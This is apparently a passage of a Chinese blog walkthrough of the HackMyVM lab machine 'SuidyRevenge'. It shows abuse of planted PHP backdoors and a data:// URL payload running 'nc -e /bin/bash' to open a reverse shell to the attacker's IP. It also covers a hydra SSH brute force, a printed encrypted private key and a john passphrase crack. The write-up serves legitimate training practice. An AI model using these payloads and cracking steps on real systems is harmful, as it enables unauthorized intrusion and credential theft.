<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl 192.168.58.83</span></span><br><span class="line">Im proud <span class="keyword">to</span> announce <span class="keyword">that</span> <span class="string">&quot;theuser&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> anymore <span class="keyword">in</span> our servers.</span><br><span class="line">Our admin <span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">the</span> best admin <span class="keyword">of</span> <span class="keyword">the</span> world.</span><br><span class="line">-suidy</span><br><span class="line"></span><br><span class="line">&lt;!<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">the</span> best admin, IM IN!!!!</span><br><span class="line">He only changed <span class="keyword">my</span> password <span class="keyword">to</span> a different <span class="keyword">but</span> I had <span class="built_in">time</span></span><br><span class="line"><span class="keyword">to</span> <span class="keyword">put</span> <span class="number">2</span> backdoors (.php) <span class="keyword">from</span> <span class="keyword">my</span> KALI <span class="keyword">into</span> /supersecure <span class="keyword">to</span> keep <span class="keyword">the</span> access!</span><br><span class="line"></span><br><span class="line">-theuser</span><br><span class="line"></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>根据这里的提示信息，theuser放了两个后门php文件在&#x2F;supersecure，这里在本机上面先看看这些文件是什么名字</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">ls</span> /usr/share/webshells/php </span><br><span class="line">findsocket  php-backdoor.php  php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.php</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>最后发现这个simple-backdoor.php是可以用的，使用方式就是?cmd的任意命令执行<br>发现这个目录下面有两个的后门分别是<br><img src="https://pic1.imgdb.cn/item/67c70bebd0e0a243d40be657.png"><br>但是在这里反弹shell没有成功<br><img src="https://pic1.imgdb.cn/item/67c70c60d0e0a243d40be67e.png"><br>那就尝试另外一个后门文件<br><img src="https://pic1.imgdb.cn/item/67c70ca1d0e0a243d40be681.png"><br>这个后门文件是用来读取文件，所以就想到用php伪协议执行命令<br>拿到www的shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>/supersecure/mysuperbackdoor.php?file=data:<span class="regexp">//</span>text/plain,<span class="variable">%3C</span>?php<span class="variable">%20system</span>(<span class="variable">%2</span>2nc<span class="variable">%20</span>-e<span class="variable">%20</span>/bin/bash<span class="variable">%20192</span><span class="number">.168</span><span class="number">.58</span><span class="number">.11</span><span class="variable">%20123</span>4<span class="variable">%22</span>);</span><br><span class="line">┌──(root㉿kakeru)-[<span class="regexp">/usr/s</span>hare/webshells/php]</span><br><span class="line">└─<span class="comment"># nc -lp 1234        </span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure></div>
<h1 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@suidyrevenge</span><span class="symbol">:~/html</span><span class="variable">$ </span>ls</span><br><span class="line">index.html  murdanote.txt  supersecure</span><br><span class="line">www-data<span class="variable">@suidyrevenge</span><span class="symbol">:~/html</span><span class="variable">$ </span>cat murdanote.txt </span><br><span class="line">I always lost my password so <span class="title class_">Im</span> using </span><br><span class="line">one password from rockyou.txt !</span><br><span class="line"></span><br><span class="line">-murda</span><br></pre></td></tr></table></figure></div>
<p>找到一个murda提示文件，提示我们要用rockyou字典爆破密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -l murda -P rockyou.txt ssh://<span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span></span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">22</span>:<span class="number">36</span>:<span class="number">53</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Many SSH configurations <span class="keyword">limit</span> the number <span class="keyword">of</span> parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">14344399</span> <span class="keyword">login</span> tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">896525</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>:<span class="number">22</span>/</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>   <span class="keyword">login</span>: murda   <span class="keyword">password</span>: iloveyou</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Writing restore file because <span class="number">2</span> final worker threads did <span class="keyword">not</span> complete <span class="keyword">until</span> <span class="keyword">end</span>.</span><br><span class="line">[ERROR] <span class="number">2</span> targets did <span class="keyword">not</span> resolve <span class="keyword">or</span> could <span class="keyword">not</span> be connected</span><br><span class="line">[ERROR] <span class="number">0</span> target did <span class="keyword">not</span> complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">22</span>:<span class="number">37</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure></div>
<p>登录到murda  有一个secret.txt文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">murda@suidyrevenge:~$ ls</span><br><span class="line">secret.txt</span><br><span class="line">murda@suidyrevenge:~$ cat secret.txt </span><br><span class="line">I know <span class="literal">that</span> theuser <span class="keyword">is</span> here!</span><br><span class="line">I just got the id_rsa <span class="keyword">from</span> <span class="string">&quot;violent&quot;</span>.</span><br><span class="line">I will put the key <span class="keyword">in</span> a secure place <span class="keyword">for</span> theuser!</span><br><span class="line">I hope he find <span class="literal">it</span>.</span><br><span class="line">Remember <span class="literal">that</span> rockyou.txt <span class="keyword">is</span> your friend!</span><br></pre></td></tr></table></figure></div>
<p>根据提示找到这个id_rsa</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">murda@suidyrevenge:~$ find <span class="symbol">/</span> <span class="operator">-</span>name <span class="string">&quot;id_rsa&quot;</span> <span class="operator">-</span>print <span class="number">2</span><span class="operator">&gt;</span><span class="symbol">/dev/null</span></span><br><span class="line"><span class="symbol">/usr/games/id_rsa</span></span><br><span class="line">murda@suidyrevenge:~$ cat <span class="symbol">/usr/games/id_rsa</span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDGbexiJO</span><br><span class="line">b7KaTASSyt9yKFAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC<span class="symbol">/9FkJSQol</span></span><br><span class="line">CNgAMG4SeDpKctz5<span class="symbol">/h6ylTx0vT73OzMwYO97HL/tRrfL0gOWV2UNTuOFwg5fBorYZfBgql</span></span><br><span class="line">bVzsIuCitxvoButf59aeoZtLxeUUuUm3G7Q06IvLV2vj<span class="operator">+</span>VgJ2i2tUjXboCcQ0Yv<span class="operator">+</span>Bj9JBC</span><br><span class="line"><span class="operator">+</span><span class="symbol">/6fG9j+ED7Pi42zjm9zNQsPhrwviHptksnKwpsV5KhBNuO3heeZvydX/sudsCCrYXBKoe</span></span><br><span class="line">P8abXDqJYXhjskJupu8Rb0bcLxR1uEIGgsRww7waBaiag65WnXBwTrzjriWFdCJcI2lfdc</span><br><span class="line">l7g<span class="symbol">/b6T5UfxFSzmdNEZvaH/SNvPEpE8bAUW9rcJwwEJZyIrc4z5VAAAD0PmVBELTPOuptO</span></span><br><span class="line"><span class="number">2</span>LGbENxSNYTLn6TqacFrj76WfTo7Q81QdCw9IJ0ruu0ivvtQWAS2CmG7Hq7vE8b<span class="operator">+</span>T6KI8w</span><br><span class="line">sRJkfpON5nr5e<span class="operator">+</span>mfCGD7Gt0WVBaZ1SolbN17XoSNyTNq8jqF9EcwnsqIM8SRWrLERufCCs</span><br><span class="line">SMDJlGb2<span class="symbol">/khum3fgDvI1R7gm0KYQRRJu33qx9ZXHRmCGKvEMV/pSaIJb2JBTQ9N/QcMlVK</span></span><br><span class="line">RGsVC<span class="symbol">/NNhwcWSMQh6DGLmcC+yZvo5lxBnNUibWKNtf2zTx6yep6SwVzvt9Qg5aZ1exIEYa</span></span><br><span class="line"><span class="number">9</span>bmpZCzHVpHHK859U1l0FNJoBFrCiC0CssPv4E<span class="operator">+</span>g1iLA47NXYCeQxpWvZPsqXwr<span class="operator">+</span>J46vR9</span><br><span class="line">UC<span class="operator">+</span>pZHy9bOHc0J<span class="operator">+</span>CTP80vEazyMN0Uko9<span class="symbol">/R2iJ+7GeQgtzoVBt7mqjaoIDljXOQ6YD5F7a8</span></span><br><span class="line"><span class="number">5</span>LvfFgW691eKdoZbGjaALMdV629MHdm6t5KL56YO9bbWlpgvo61iYqrAE2t<span class="operator">+</span>jhlUoQeQ<span class="operator">+</span><span class="number">9</span></span><br><span class="line">cH8fKHVXctRCypsx577qTwnUFtLn<span class="operator">+</span>l3f<span class="operator">+</span>Twl1ulxpV<span class="symbol">/bs497n1a1aDNpAoMJYt0601+3H8</span></span><br><span class="line">qJQQ12QiBEi1CTvt<span class="operator">+</span>W2<span class="symbol">/d1EQeZ+MDUSqFCLDGE34xu6lI+/Wjmv03qBSRvdUK91MX1Lb2n</span></span><br><span class="line">uUZN0OH6pJbmj3oxHSB6ADFetH7bVFXKC4VjTGltoRWD3sH2n5UIcVZZ<span class="operator">+</span><span class="number">1</span>qha3n37U8Q1<span class="symbol">/</span></span><br><span class="line">OVwSqtTE6NbYQsnsydv9plM1xLkacY9<span class="operator">+</span>db35wPBQSVkuiTuENKUbDMIFC8GiFTzshG9Owr</span><br><span class="line"><span class="number">8</span>LvdK<span class="operator">+</span>LSxCrjQcAch7AYFma7IEtkJDHHAC2dwHw<span class="operator">+</span>ojqb510c9d5oBAd<span class="symbol">/vboElE9ZjYbOq2</span></span><br><span class="line">WT9UdY26<span class="symbol">/LOQ1LZVZ9LU3hW+N9zRLgJZz6jfvELGlS2jxNjBVW8+0dGHOBFxu+lHjyZCaA</span></span><br><span class="line">YaUwJvd2lTkoLIH3o7Wog7c69tTtVP39Lx2trFCRtWs0eJIP6bGMsB83nwWzxiRnUKX5<span class="symbol">/3</span></span><br><span class="line">anvv<span class="symbol">/RtCRJoEsSX9vtXJpMnE4ZXO4H7LglGWe/dlIRkF/Pm81FPB+kiuAYbe+CRVIvEC+m</span></span><br><span class="line">dkCybp6<span class="operator">++</span>R<span class="symbol">/Td2GQ/uh3Iz3Q6CbmGEpnjAtUBjizQc4vrPpB0tgsEXpzB5ZAj10IjgK6a+</span></span><br><span class="line"><span class="number">2</span>PIaEbU2nsSic6JT1tN8GOAx3kca<span class="operator">+</span>x94PZ9quSvGxBIjCcre5IC1vDPSl9ltPIZwwvDIbN</span><br><span class="line">ORebGQ41OO<span class="operator">++</span>boyqMUAeWPCp0U16acJ7l<span class="symbol">/copQQcuIZ0mTched3eyetddQ5FMCHv2EbvK5</span></span><br><span class="line">ovZ9EUC8ryJgnq1<span class="operator">/</span><span class="operator">+</span>ECUOutT5q49Q<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>

<p>直接用这个私钥登录 提示要passphrase ，所以先用john破解一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh2john id_rsa &gt; hash                               </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# john <span class="comment">--wordlist=./rockyou.txt hash                     </span></span><br><span class="line"><span class="keyword">Using</span> <span class="keyword">default</span> <span class="keyword">input</span> <span class="keyword">encoding</span>: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="keyword">password</span> hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH <span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">1</span> (KDF/cipher [<span class="number">0</span>=MD5/AES <span class="number">1</span>=MD5/<span class="number">3</span>DES <span class="number">2</span>=Bcrypt/AES]) <span class="keyword">is</span> <span class="number">2</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">2</span> (iteration count) <span class="keyword">is</span> <span class="number">16</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> <span class="keyword">or</span> Ctrl-C <span class="keyword">to</span> <span class="keyword">abort</span>, almost <span class="keyword">any</span> other key <span class="keyword">for</span> status</span><br><span class="line">ihateu           (id_rsa)     </span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">42</span> DONE (<span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">23</span>:<span class="number">01</span>) <span class="number">0.02329</span>g/s <span class="number">29.07</span>p/s <span class="number">29.07</span>c/s <span class="number">29.07</span>C/s ramona..shirley</span><br><span class="line">Use the &quot;--show&quot; <span class="keyword">option</span> <span class="keyword">to</span> display <span class="keyword">all</span> <span class="keyword">of</span> the cracked passwords reliably</span><br><span class="line"><span class="keyword">Session</span> completed. </span><br></pre></td></tr></table></figure></div>
<p>找到violent的密码是<code>ihateu</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">violent<span class="variable">@suidyrevenge</span>:~<span class="variable">$ </span>find / -user violent -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span> | grep -ivE <span class="string">&quot;sys|run|proc&quot;</span></span><br><span class="line"><span class="regexp">/home/violent</span></span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.bashrc</span></span><br><span class="line"><span class="regexp">/home</span><span class="regexp">/violent/</span>.bash_logout</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.ssh</span></span><br><span class="line"><span class="regexp">/home</span><span class="regexp">/violent/</span>.ssh/id_rsa</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.ssh/authorized</span>_keys</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.ssh/id</span>_rsa.pub</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.bash_history</span></span><br><span class="line"><span class="regexp">/home</span><span class="regexp">/violent/</span>.profile</span><br><span class="line"><span class="regexp">/dev/pts</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></div>
<p>找了一下这个用户也没有有用的信息，所以最后还是要回到theuser用户，然后得到suidy用户的权限</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机好奇怪，设置了这么多误导项，但是一开始就可以登录theuser用户，感觉完全也没必要，然后后面应该提权部分也有点bug<br>我猜是对文件大小有判断的，但是我稍微写下设置uid的c文件大小就一样了。。</p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>guayu-kakeru
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://guayu-kakeru.github.io/posts/23894.html" title="HMV-SuidyRevenge">https://guayu-kakeru.github.io/posts/23894.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
              <a href="/tags/HMV/" rel="tag"># HMV</a>
              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/posts/40609.html" rel="prev" title="CSRF漏洞学习笔记">
      <i class="fa fa-chevron-left"></i> CSRF漏洞学习笔记
    </a></div>
      <div class="post-nav-item">
    <a href="/posts/21833.html" rel="next" title="SQL漏洞学习笔记">
      SQL漏洞学习笔记 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B1"><span class="nav-text">web探测1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%831"><span class="nav-text">提权1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-text">web2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%832"><span class="nav-text">提权2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">68</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



  <div class="links-of-recent-posts motion-element">
    <div class="links-of-recent-posts-title">
      <i class="fa fa-history fa-fw"></i>
      最近文章
    </div>
    <ul class="links-of-recent-posts-list">
        <li class="links-of-recent-posts-item">
          <a href="/posts/37991.html" title="posts&#x2F;37991.html">web方向wp</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/62478.html" title="posts&#x2F;62478.html">HMV-easypwn WP复现与复盘</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/51504.html" title="posts&#x2F;51504.html">HTTP请求走私漏洞学习</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/57863.html" title="posts&#x2F;57863.html">HMV-Driftingblues3</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/53614.html" title="posts&#x2F;53614.html">flask框架&&ssti学习笔记</a>
        </li>
    </ul>
  </div>
      </div>

      
      
        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
          <div class="links-of-blogroll-title">
            <i class="fa fa-history fa-" aria-hidden="true"></i>
            
          </div>
          <ul class="links-of-blogroll-list">
            
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
          </ul>
        </div>
      
    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
</div>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
